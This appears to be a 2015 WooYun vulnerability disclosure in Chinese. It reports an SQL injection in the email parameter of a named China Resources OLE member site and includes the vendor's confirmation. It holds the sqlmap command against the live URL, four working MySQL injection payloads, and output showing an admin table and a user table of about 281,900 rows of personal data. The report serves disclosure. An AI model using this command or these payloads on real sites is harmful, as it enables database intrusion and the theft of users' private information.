wybug_title: 华润OLE某站SQL注入一枚/管理员信息及至少十多万用户信息泄露
wybug_detail: 漏洞详情 披露状态： 2015-07-27： 细节已通知厂商并且等待厂商处理中 2015-07-27： 厂商已经确认，细节仅向厂商公开 2015-08-06： 细节向核心白帽子及相关领域专家公开 2015-08-16： 细节向普通白帽子公开 2015-08-26： 细节向实习白帽子公开 2015-09-10： 细节向公众公开 简要描述： 上午似乎交重了，下午这枚总不会吧！！0_0 详细说明： 报错注入：http://vip.crvole.com.cn/account/verifyEmail?email=email参数，爆出了当前库 交给sqlmap吧！ 漏洞证明： C:\Python27\sqlmap>sqlmap.py -u "http://vip.crvole.com.cn/account/verifyEmail?email=1" -p "email" _ ___ ___| |_____ ___ ___ {1.0-dev-nongit-20150609}|_ -| . | | | .'| . ||___|_ |_|_|_|_|__,| _| |_| |_| http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 17:06:47[17:06:47] [INFO] resuming back-end DBMS 'mysql'[17:06:47] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: email (GET) Type: boolean-based blind Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause Payload: email=1" RLIKE (SELECT (CASE WHEN (4865=4865) THEN 1 ELSE 0x28 END)) AND "QWjF"="QWjF Type: error-based Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause Payload: email=1" AND (SELECT 6236 FROM(SELECT COUNT(*),CONCAT(0x716b787671,(SELECT (ELT(6236=6236,1))),0x71707a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND "TpAx"="TpAx Type: stacked queries Title: MySQL > 5.0.11 stacked queries (SELECT - comment) Payload: email=1";(SELECT * FROM (SELECT(SLEEP(5)))KCHR)# Type: AND/OR time-based blind Title: MySQL >= 5.0.12 AND time-based blind (SELECT) Payload: email=1" AND (SELECT * FROM (SELECT(SLEEP(5)))ERma) AND "CoNh"="CoNh---[17:06:48] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.28back-end DBMS: MySQL 5.0 admin表 其中一个表user，21W用户 web application technology: PHP 5.3.28back-end DBMS: MySQL 5.0[17:14:38] [INFO] resumed: 281900Database: crvole+--------+---------+| Table | Entries |+--------+---------+| `user` | 281900 |+--------+---------+ 涉及较多隐私信息email,qq,address,sex,mobile,msn.... 修复方案： 过滤!高Rank 版权声明：转载请注明来源 凌零1@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-07-27 15:38 厂商回复： 漏洞出现点比较低级，程序猿太懒，由于用户多和密码加密算法过于简单导致危害扩大，如外泄可能又多了跑库素材，感谢提交。我们将会加强控制对下属单位和利润中心的安全管控。此处不宜发招聘。By ξTreasureζ 最新状态： 暂无
